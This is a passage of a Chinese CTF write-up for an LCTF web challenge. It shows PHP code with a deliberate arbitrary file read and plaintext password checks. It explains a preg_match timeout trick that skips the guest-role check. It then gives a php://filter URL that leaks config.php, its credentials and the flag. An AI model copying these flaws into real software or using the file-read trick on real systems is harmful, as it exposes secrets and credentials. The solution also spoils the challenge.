+    $password = (isset($_POST['password']) === true &amp;&amp; $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');
+
+    if (strlen($username) &gt; 32 || strlen($password) &gt; 32) {
+        die('Invalid input');
+    }
+
+    $sth = $pdo-&gt;prepare('SELECT password FROM users WHERE username = :username');
+    $sth-&gt;execute([':username' =&gt; $username]);
+    if ($sth-&gt;fetch()[0] !== $password) {
+        die('wrong password');
+    }
+    $_SESSION['username'] = $username;
+    unset($_SESSION['is_logined']);
+    unset($_SESSION['is_guest']);
+    #echo $username;
+    header("Location: member.php");
+?&gt;</code></pre><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;">member.php</h4><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+    error_reporting(0);
+    session_start();
+    include('config.php');
+    if (isset($_SESSION['username']) === false) {
+        die('please login first');
+    }
+    try{
+        $pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass);
+    }catch (Exception $e){
+        die('mysql connected error');
+    }
+    $sth = $pdo-&gt;prepare('SELECT identity FROM identities WHERE username = :username');
+    $sth-&gt;execute([':username' =&gt; $_SESSION['username']]);
+    if ($sth-&gt;fetch()[0] === 'GUEST') {
+        $_SESSION['is_guest'] = true;
+    }
+
+    $_SESSION['is_logined'] = true;
+    if (isset($_SESSION['is_logined']) === false || isset($_SESSION['is_guest']) === true) {
+
+    }else{
+        if(isset($_GET['file'])===false)
+            echo "None";
+        elseif(is_file($_GET['file']))
+            echo "you cannot give me a file";
+        else
+            readfile($_GET['file']);
+    }
+?&gt;</code></pre><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">php的preg_match</h3><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDum8I0qhTLSGOVAicEl5xI8jOd8rI9yFVEbE9rAmW2AHQUF43o3VB88qA/0?wx_fmt=png" class="" data-ratio="0.5100864553314121" data-w="1041" data-type="png" src="../Images/d4873f3882f71d6418bcde5b459d558b.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDum8I0qhTLSGOVAicEl5xI8jOd8rI9yFVEbE9rAmW2AHQUF43o3VB88qA/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">在code部分填入超长的字符串，并且符合preg_match匹配的模式。则在register.php在preg_match时导致超时php脚本停止，字符串<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">guest</code>没有被插入成功。之后在login.php中登陆用户跳转至member.php后，下述代码将会跳过:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">if ($sth-&gt;fetch()[0] === 'GUEST') {
+    $_SESSION['is_guest'] = true;
+}</code></pre><p style="margin-bottom: 1.2em !important;">并在接下来的判断中，进入else分支：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">if(isset($_GET['file'])===false)
+    echo "None";
+elseif(is_file($_GET['file']))
+    echo "you cannot give me a file";
+else
+    readfile($_GET['file']);</code></pre><p style="margin-bottom: 1.2em !important;">上次微信崩溃，好像也是正则匹配搞得鬼嘛。二者原理不同，不过应该还是有某种神似的。</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">php的is_file和readfile</h3><p style="margin-bottom: 1.2em !important;">在进入成功后，需要提供file参数来读取文件。需要绕过is_file，考虑配合php伪协议。</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">/member.php?file=php://filter/read=convert.base64-encode/resource=config.php</code></pre><p style="margin-bottom: 1.2em !important;">isfile判断为假，而readfile利用伪协议读取到config.php文件</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuLjm12mwFiaYglOQibYlvmnTQhD4RYLZ810GEVYwcGTE5xYvia0hy9p1LQ/0?wx_fmt=png" class="" data-ratio="0.3449554896142433" data-w="1348" data-type="png" src="../Images/2259f717a98b297b0840e534a7dcb273.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuLjm12mwFiaYglOQibYlvmnTQhD4RYLZ810GEVYwcGTE5xYvia0hy9p1LQ/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">得到config.php源码：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+$user = "xdsec";
+$pass = "xdsec";
+$flag = "LCTF{pr3_maTch_1s_A_amaz1ng_Function}"
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">flag:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">LCTF{pr3_maTch_1s_A_amaz1ng_Function}</code></pre><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">小结</h2><ul style="" class=" list-paddingleft-2"><li><p>PHP的preg_match</p></li><li><p>isfile、readfile</p></li><li><p>php伪协议</p></li></ul><h1 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.6em;border-bottom: 1px solid rgb(221, 221, 221);">后言</h1><p style="margin-bottom: 1.2em !important;">能看到这里的都是真爱（应该把）。相信很多新手跟我一样，在复现一些wp的时候会丈二和尚摸不着头脑，弄不清这里为什么要这么做/或者怎么想到的。虽然ctf中需要一些脑洞，但肯定也是需要有知识储备的。所以自己在写wp的时候，会加入许多的废话，尽量帮助各位看客理解。：）另外既然都看到这里了，何不说句话再走啊。若有错误，麻烦各位大佬指出啊！</p><section class="" data-tools="135&#x7F16;&#x8F91;&#x5668;" data-id="86357" style="max-width: 100%;box-sizing: border-box;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);line-height: 25.6px;font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;;border-width: 0px;border-style: none;border-color: initial;word-wrap: break-word !important;"><section style="max-width: 100%;text-align: center;box-sizing: border-box !important;word-wrap: break-word !important;"><section style="display: inline-block;max-width: 100%;width: 192px;box-sizing: border-box !important;word-wrap: break-word !important;"><section class="" data-tools="135编辑器" data-id="86357" style="max-width: 100%;box-sizing: border-box;border-width: 0px;border-style: none;border-color: initial;word-wrap: break-word !important;"><section style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"><p style="max-width: 100%;min-height: 1em;display: inline-block;width: 192px;box-sizing: border-box !important;word-wrap: break-word !important;"><img class="" data-ratio="0.125" data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZmbX5NFgic65Bo4SIYUK4ib9ibvpyoaPJibpkS2Q8Q24DicBfEtnh6xBcFSw/640.png?" data-type="png" data-w="600" style="display: inline;box-sizing: border-box !important;word-wrap: break-word !important;visibility: visible !important;width: 192px !important;" title="墨迹晕染分割线" width="192px" src="../Images/c96a1b435221f7e6cf4c4e3eca199d9e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZmbX5NFgic65Bo4SIYUK4ib9ibvpyoaPJibpkS2Q8Q24DicBfEtnh6xBcFSw/640.png?"/></p></section></section></section></section></section><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);line-height: 25.6px;font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"/></p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);line-height: 25.6px;font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;;box-sizing: border-box !important;word-wrap: break-word !important;"><img class="" data-ratio="0.3036773428232503" data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?" data-type="jpeg" data-w="843" style="line-height: 25.6px;box-sizing: border-box !important;word-wrap: break-word !important;visibility: visible !important;width: auto !important;" width="auto" src="../Images/4f6f4b18070490b9670250379d20693d.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?"/></p>
+        
+</body>
+</html>
